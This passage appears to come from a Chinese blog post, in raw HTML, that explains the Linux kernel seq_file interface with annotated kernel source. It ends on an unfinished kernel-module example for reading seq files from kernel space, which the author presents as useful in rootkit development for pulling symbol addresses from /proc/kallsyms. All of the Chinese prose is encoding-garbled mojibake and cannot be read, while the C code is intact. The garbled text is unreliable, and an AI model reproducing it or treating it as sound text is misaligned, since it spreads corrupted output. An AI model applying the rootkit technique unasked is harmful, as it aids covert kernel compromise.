class="hljs-keyword">break</span>;<br>&#125;<br>pos += m-&gt;count;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (pos == offset)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br><span class="hljs-keyword">return</span> error;<br><br>Eoverflow:<br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> !m-&gt;buf ? -ENOMEM : -EAGAIN;<br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ° <code>seq_read_iter()</code> ï¼Œæ¥ä¸‹æ¥é¦–å…ˆæ£€æŸ¥ <code>buf</code> æ˜¯å¦åˆ†é…ï¼Œä¹‹åæ£€æŸ¥ <code>buf</code> ä¸Šæ˜¯å¦æœ‰æ•°æ® <code>m-&gt;count != 0</code> ï¼Œè‹¥æ˜¯åˆ™æ‹·è´åˆ° <code>iovec</code> æ‰€æŒ‡ç¤ºçš„å†…å­˜ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* grab buffer if we didn&#x27;t have one */</span><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>&#125;<br><span class="hljs-comment">// something left in the buffer - copy it out first</span><br><span class="hljs-keyword">if</span> (m-&gt;count) &#123;<br>n = copy_to_iter(m-&gt;buf + m-&gt;from, m-&gt;count, iter);<br>m-&gt;count -= n;<br>m-&gt;from += n;<br>copied += n;<br><span class="hljs-keyword">if</span> (m-&gt;count)<span class="hljs-comment">// hadn&#x27;t managed to copy everything</span><br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯é¢„æ£€æŸ¥éƒ¨åˆ†ï¼Œä½œç”¨æ˜¯ <strong>è¿›è¡Œä¸€æ¬¡è¯»å–ï¼Œå¹¶æ£€æŸ¥ç¼“å†²åŒºå¤§å°æ˜¯å¦è¶³å¤Ÿ</strong> ï¼š</p><ul><li>é¦–å…ˆåˆå§‹åŒ–åºåˆ—æ–‡ä»¶ä¸´æ—¶ç¼“å†²åŒºçš„èµ·å§‹åç§»ä¸º 0ï¼Œè°ƒç”¨ <code>op-&gt;start()</code>  è¿›è¡Œåˆå§‹åŒ–ï¼Œç„¶åè¿›å…¥è¯»å–å¾ªç¯ï¼š<ul><li>é¦–å…ˆè°ƒç”¨ <code>op-&gt;show()</code> æ‰“å°å½“å‰åºåˆ—æ•°æ®å¯¹è±¡åˆ°ä¸´æ—¶ç¼“å†²åŒºï¼Œè‹¥è·³è¿‡ï¼ˆå¦‚ <code>SEQ_SKIP</code> ï¼‰åˆ™å½“å‰è½®çš„è¯»å–é•¿åº¦ï¼ˆ <code>m-&gt;count</code> ï¼‰è®°ä¸º <code>0</code> ï¼Œå¹¶å¼€å§‹ä¸‹è½®å¾ªç¯</li><li>è‹¥ä¸´æ—¶ç¼“å†²åŒº<strong>æœªæ»¡</strong> ï¼Œè·³åˆ° Fill æ ‡ç­¾ <strong>å¼€å§‹æ­£å¼çš„ç»§ç»­è¯»å–</strong> ï¼Œå¦åˆ™è°ƒç”¨ <code>op-&gt;stop()</code> åœæ­¢å¹¶<strong>é‡æ–°åˆ†é…ä¸€ä¸ªæ›´å¤§çš„ç¼“å†²åŒº</strong>ï¼Œä¹‹åé‡æ–°è¯»å–å½“å‰åºåˆ—æ•°æ®å¯¹è±¡</li></ul></li><li>è‹¥æ­£å¸¸é€€å‡ºå¾ªç¯ï¼ˆbreakï¼‰ï¼Œè¯´æ˜è¯»å–å¤±è´¥ï¼Œè°ƒç”¨ <code>op-&gt;stop()</code> åœæ­¢å¹¶ç›´æ¥è·³åˆ° <code>Done</code> æ ‡ç­¾è¿›è¡Œæ”¶å°¾</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get a non-empty record in the buffer</span><br>m-&gt;from = <span class="hljs-number">0</span>;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>err = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// EOF or an error</span><br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">// hard error</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(err))<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (unlikely(!m-&gt;count)) &#123; <span class="hljs-comment">// empty record</span><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!seq_has_overflowed(m)) <span class="hljs-comment">// got it</span><br><span class="hljs-keyword">goto</span> Fill;<br><span class="hljs-comment">// need a bigger buffer</span><br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>&#125;<br><span class="hljs-comment">// EOF or an error</span><br>m-&gt;op-&gt;stop(m, p);<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯æ ¸å¿ƒçš„æ•°æ®è¯»å–éƒ¨åˆ†äº†ï¼š</p><ul><li>æ ¸å¿ƒè¿˜æ˜¯ä¸€ä¸ªè¯»å–å¾ªç¯ï¼Œä¸è¿‡å‰é¢é¢„è¯»å–æ—¶å·²ç» <code>start()</code> è¿‡äº†æ‰€ä»¥è¿™é‡Œç›´æ¥å¼€å§‹è¯»å–ï¼š<ul><li>é¦–å…ˆç›´æ¥è°ƒç”¨ <code>op-&gt;next()</code> è·å–ä¸‹ä¸€ä¸ªåºåˆ—æ•°æ®å¯¹è±¡ï¼ˆå› ä¸ºå‰é¢å·²ç»è¯»è¿‡ä¸€æ¬¡äº†ï¼‰ï¼Œè‹¥å¼€å‘è€…å®šä¹‰çš„è¯¥å‡½æ•°æ²¡æœ‰æ›´æ–° <code>m-&gt;index</code> åˆ™ä¼šæ‰‹åŠ¨è‡ªå¢ï¼Œè·å–å‡ºé”™åˆ™è·³å‡ºå¾ªç¯</li><li>è‹¥ç¼“å†²åŒºä¸Šå·²æœ‰æ•°æ®é‡å¤§äº iovec è¿­ä»£å™¨å‰©ä½™é‡ï¼ˆ<code>iov_iter_count(iter)</code>ï¼‰åˆ™è·³å‡ºå¾ªç¯</li><li>è°ƒç”¨ <code>op-&gt;show()</code> å°†æ–°è·å–åˆ°çš„åºåˆ—æ•°æ®å¯¹è±¡æ‰“å°åˆ°ç¼“å†²åŒºä¸Šï¼Œè‹¥æº¢å‡ºåˆ™è·³å‡ºå¾ªç¯ï¼Œæ³¨æ„è¿™é‡Œçš„ <code>offs</code> è®°å½•çš„æ˜¯å½“å‰æ¬¡å¾ªç¯å¼€å§‹å‰çš„ <code>m-&gt;count</code></li></ul></li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>op-&gt;stop()</code> åœæ­¢ï¼Œå¹¶è°ƒç”¨ <code>copy_to_iter()</code> å°†ä¸´æ—¶ç¼“å†²åŒºä¸Šæ•°æ®æ‹·è´åˆ° iovec è¿­ä»£å™¨æ‰€æŒ‡ç¤ºçš„ iovec æ‰€æŒ‡ç¤ºçš„å†…å­˜ä¸Š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">Fill:<br><span class="hljs-comment">// one non-empty record is in the buffer; if they want more,</span><br><span class="hljs-comment">// try to fit more in, but in any case we need to advance</span><br><span class="hljs-comment">// the iterator once for every record shown.</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-type">size_t</span> offs = m-&gt;count;<br><span class="hljs-type">loff_t</span> pos = m-&gt;index;<br><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos == m-&gt;index) &#123;<br>pr_info_ratelimited(<span class="hljs-string">&quot;buggy .next function %ps did not update position index\n&quot;</span>,<br>    m-&gt;op-&gt;next);<br>m-&gt;index++;<br>&#125;<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// no next record for us</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (m-&gt;count &gt;= iov_iter_count(iter))<br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = offs;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err || seq_has_overflowed(m)) &#123;<br>m-&gt;count = offs;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br>n = copy_to_iter(m-&gt;buf, m-&gt;count, iter);<br>copied += n;<br>m-&gt;count -= n;<br>m-&gt;from = n;<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯ä¸€äº›å¸¸è§„çš„æ”¶å°¾å·¥ä½œï¼Œä¾‹å¦‚åœ¨åºåˆ—æ–‡ä»¶ä¸ kiocb ä¸­è®°å½•æ‹·è´çš„å­—èŠ‚æ•°ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">Done:<br><span class="hljs-keyword">if</span> (unlikely(!copied)) &#123;<br>copied = m-&gt;count ? -EFAULT : err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>iocb-&gt;ki_pos += copied;<br>m-&gt;read_pos += copied;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> copied;<br>Enomem:<br>err = -ENOMEM;<br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br>EXPORT_SYMBOL(seq_read_iter);<br></code></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºåºåˆ—æ–‡ä»¶æ¥å£çš„è¯»å–å®ç°å…¶å®éå¸¸çš„ç®€æ´</p><h2 id="seq-lseek-ï¼šåºåˆ—æ–‡ä»¶åç§»æ“ä½œ"><a href="#seq-lseek-ï¼šåºåˆ—æ–‡ä»¶åç§»æ“ä½œ" class="headerlink" title="seq_lseek()ï¼šåºåˆ—æ–‡ä»¶åç§»æ“ä½œ"></a>seq_lseek()ï¼šåºåˆ—æ–‡ä»¶åç§»æ“ä½œ</h2><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€æ´ï¼Œä¸»è¦å°±æ˜¯ç§»åŠ¨å½“å‰çš„åºåˆ—æ–‡ä»¶åç§»ï¼Œå¯¹äºç›¸å¯¹åç§»å€¼ï¼ˆ<code>SEEK_CUR</code> è·¯å¾„ï¼‰ä¼šå…ˆè½¬æ¢æˆç»å¯¹åç§»å€¼ï¼Œè¿›è¡Œåç§»å€¼è®¡ç®—çš„è·¯å¾„å½’ä¸€åŒ–ï¼Œåç§»å€¼ç§»åŠ¨åˆ™ä¸»è¦é  <code>traverse()</code> å®Œæˆï¼Œå‰æ–‡å·²ç»è®²è¿‡æ•…è¿™é‡Œä¸å†èµ˜å™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_lseek -åºåˆ—æ–‡ä»¶çš„ -&gt;llseek() æ–¹æ³•</span><br><span class="hljs-comment"> *@file: the file in question</span><br><span class="hljs-comment"> *@offset: æ–°çš„åç§»å€¼</span><br><span class="hljs-comment"> *@whence: 0 for ç»å¯¹å€¼, 1 for ç›¸å¯¹ä½ç½®</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;llseek()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">loff_t</span> <span class="hljs-title function_">seq_lseek</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">loff_t</span> offset, <span class="hljs-type">int</span> whence)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> retval = -EINVAL;<br><br>mutex_lock(&amp;m-&gt;lock);<br><span class="hljs-keyword">switch</span> (whence) &#123;<br><span class="hljs-keyword">case</span> SEEK_CUR:<br>offset += file-&gt;f_pos;<br>fallthrough;<br><span class="hljs-keyword">case</span> SEEK_SET:<br><span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>retval = offset;<br><span class="hljs-keyword">if</span> (offset != m-&gt;read_pos) &#123;<br><span class="hljs-keyword">while</span> ((retval = traverse(m, offset)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (retval) &#123;<br><span class="hljs-comment">/* with extreme prejudice... */</span><br>file-&gt;f_pos = <span class="hljs-number">0</span>;<br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = offset;<br>retval = file-&gt;f_pos = offset;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>file-&gt;f_pos = offset;<br>&#125;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>EXPORT_SYMBOL(seq_lseek);<br></code></pre></td></tr></table></figure><h2 id="seq-release-ï¼šå…³é—­åºåˆ—æ–‡ä»¶"><a href="#seq-release-ï¼šå…³é—­åºåˆ—æ–‡ä»¶" class="headerlink" title="seq_release()ï¼šå…³é—­åºåˆ—æ–‡ä»¶"></a>seq_release()ï¼šå…³é—­åºåˆ—æ–‡ä»¶</h2><p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯è¿›è¡Œé‡Šæ”¾å†…å­˜çš„æ”¶å°¾å·¥ä½œï¼Œä¸å†èµ˜å™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_release -free the structures associated with sequential file.</span><br><span class="hljs-comment"> *@file: file in question</span><br><span class="hljs-comment"> *@inode: its inode</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Frees the structures associated with sequential file; can be used</span><br><span class="hljs-comment"> *as -&gt;f_op-&gt;release() if you don&#x27;t have private data to destroy.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br>kvfree(m-&gt;buf);<br>kmem_cache_free(seq_file_cache, m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_release);<br></code></pre></td></tr></table></figure><p>å¯¹äº <code>__seq_open_private()</code> ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå¯¹åº”çš„å…³é—­å‡½æ•° <code>seq_release_private()</code> ï¼ŒåŒæ ·æ˜¯åœ¨ <code>seq_release()</code> ä¸Šçš„ wrapperï¼Œä¸è¿‡ä¼šå¸®ä½ é‡Šæ”¾æ‰ <code>seq_file::private</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release_private</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span> =</span> file-&gt;private_data;<br><br>kfree(seq-&gt;private);<br>seq-&gt;private = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> seq_release(inode, file);<br>&#125;<br>EXPORT_SYMBOL(seq_release_private);<br></code></pre></td></tr></table></figure><blockquote><p>è‡³æ­¤åºåˆ—æ–‡ä»¶æ¥å£çš„å®ç°åŸºæœ¬å®Œç»“ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå®ç°å…¶å®éå¸¸çš„ç®€æ´ï¼Œè¿™ä¸ªåœºæ™¯åœ¨å†…æ ¸ä¸­å…¶å®éå¸¸å¸¸è§ï¼ˆä¾‹å¦‚è¯»å–å„ç§å†…æ ¸å¯¹è±¡çš„ä¿¡æ¯ï¼‰ï¼Œå¯¹äºå¼€å‘è€…è€Œè¨€å¹¶ä¸éœ€è¦æ¯ä¸ªåœºæ™¯éƒ½æ‰‹å†™ä¸€å¥—ï¼Œå› æ­¤é€šç”¨çš„åºåˆ—æ–‡ä»¶æ¥å£åº”è¿è€Œç”Ÿ</p></blockquote><h1 id="0x03-åºåˆ—æ–‡ä»¶æ¥å£-å…¶ä»–"><a href="#0x03-åºåˆ—æ–‡ä»¶æ¥å£-å…¶ä»–" class="headerlink" title="0x03. åºåˆ—æ–‡ä»¶æ¥å£ - å…¶ä»–"></a>0x03. åºåˆ—æ–‡ä»¶æ¥å£ - å…¶ä»–</h1><p>åºåˆ—æ–‡ä»¶æ¥å£å…¶å®æ²¡å•¥æ›´å¤šèƒ½è®²çš„ä¸œè¥¿äº†ï¼Œè¿™ä¸€èŠ‚ä¸»è¦è®°å½•ä¸€äº›æ¯”è¾ƒé›¶ç¢çš„è¿·æ€</p><h2 id="åœ¨å†…æ ¸ä¸­è¯»å–ç‰¹æ®Šåºåˆ—æ–‡ä»¶"><a href="#åœ¨å†…æ ¸ä¸­è¯»å–ç‰¹æ®Šåºåˆ—æ–‡ä»¶" class="headerlink" title="åœ¨å†…æ ¸ä¸­è¯»å–ç‰¹æ®Šåºåˆ—æ–‡ä»¶"></a>åœ¨å†…æ ¸ä¸­è¯»å–ç‰¹æ®Šåºåˆ—æ–‡ä»¶</h2><!--å› ä¸ºåºåˆ—æ–‡ä»¶æ¥å£è¢«å¼€å‘å‡ºæ¥çš„ç›®çš„ä¾¿æ˜¯ä¸ºäº†å‘ç”¨æˆ·ç©ºé—´å¯¼å‡ºå†…æ ¸æ•°æ®ï¼Œå› æ­¤åœ¨å†…æ ¸ç©ºé—´è¯»å–åºåˆ—æ–‡ä»¶åœ¨è®¾è®¡åˆæœŸå¹¶æ²¡æœ‰è¢«è€ƒè™‘åˆ°ï¼Œ æ‰€ä»¥æ•°æ®æ‹·è´ä½¿ç”¨çš„æ˜¯ AIO æ¥å£çš„ `copy_to_iter()` ï¼Œ**ä»…ç”¨æ¥å°†æ•°æ®ä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´** ï¼Œå› æ­¤ä½ æ— æ³•é€šè¿‡ `kernel_read()` è¿™æ ·çš„ API æ¥è¯»å–è¿™ç±»æ–‡ä»¶--><p>éƒ¨åˆ†çš„åºåˆ—æ–‡ä»¶æ¥å£å¯¹äºå†…æ ¸ç©ºé—´æ˜¯ä¸å¯ä»¥ä½¿ç”¨ <code>kernel_read()</code> è¿›è¡Œè¯»å–çš„ï¼Œå› ä¸ºå…¶æ–‡ä»¶å‡½æ•°è¡¨å®ç°çš„æ˜¯ <code>read()</code> æ¥å£è€Œé <code>read_iter()</code> æ¥å£ï¼Œä½†æ˜¯å®æˆ˜å¼€å‘ä¸­æˆ‘ä»¬å¾€å¾€åˆéœ€è¦åœ¨å†…æ ¸ç©ºé—´è¯»å–ä¸€äº›åºåˆ—æ–‡ä»¶ï¼Œè¿™é€šå¸¸æ˜¯å› ä¸ºè¿™ä¸€éƒ¨åˆ†å†…æ ¸æ•°æ®çš„è·å–æ¥å£å¹¶ä¸å¯¹å†…æ ¸é©±åŠ¨å¯¼å‡ºï¼Œä½†ç•™æœ‰å‘ç”¨æˆ·ç©ºé—´å¯¼å‡ºçš„åºåˆ—æ–‡ä»¶æ¥å£ï¼Œæ­¤æ—¶åºåˆ—æ–‡ä»¶æ¥å£ä¾¿å‡ ä¹æ˜¯æˆ‘ä»¬å”¯ä¸€çš„æ•°æ®è·å–æ–¹å¼</p><blockquote><p>ä¾‹å¦‚åœ¨ rootkit å¼€å‘å½“ä¸­æˆ‘ä»¬é€šå¸¸éœ€è¦è·å–å„ç§å†…æ ¸ç¬¦å·çš„åœ°å€ï¼Œä½†å¯¹åº”çš„è·å–å†…æ ¸ç¬¦å·çš„å†…æ ¸æ¥å£ <code>kallsyms_lookup_name()</code> åœ¨å†…æ ¸ç‰ˆæœ¬ <code>5.7.0</code> åé»˜è®¤ä¸å†å¯¼å‡ºï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½é€šè¿‡è¯»å– <code>/proc/kallsyms</code>  è¿›è¡Œè·å–</p></blockquote><p>è§£å†³çš„æ–¹æ¡ˆå…¶å®å¾ˆç®€å•ï¼š <strong>æˆ‘ä»¬åªéœ€è¦åˆ†é…ä¸€å—å±äºç”¨æˆ·ç©ºé—´çš„ä¸´æ—¶å†…å­˜å³å¯</strong> ï¼Œè¿™å¯ä»¥é€šè¿‡ <code>vm_mmap() &amp; vm_munmap()</code> å®Œæˆï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mman.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>;</span><br>    <span class="hljs-type">char</span> __user *ubuf;<br>    <span class="hljs-type">char</span> *kbuf;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">ssize_t</span> read_len;<br>    <span class="hljs-type">loff_t</span> fpos;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    ubuf = (<span class="hljs-type">void</span>*) vm_mmap(<span class="hljs-literal">NULL</span>,<br>                           <span class="hljs-number">0</span>,<br>                           PAGE_SIZE,<br>                           PROT_READ | PROT_WRITE,<br>                           MAP_ANONYMOUS | MAP_PRIVATE,<br>                           <span class="hljs-number">0</span>);<br>    <span 